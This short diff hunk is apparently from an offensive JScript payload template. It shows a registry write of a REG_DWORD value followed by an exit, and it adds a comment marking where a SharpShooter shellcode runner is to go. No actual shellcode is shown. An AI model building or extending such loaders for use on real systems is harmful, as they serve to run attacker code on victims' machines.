@@ -11,3 +11,5 @@ try{
 	sh.RegWrite(key, 1, "REG_DWORD");
 	WScript.Quit(1);
 }
+
+// put SharpShooter shellcode runner below
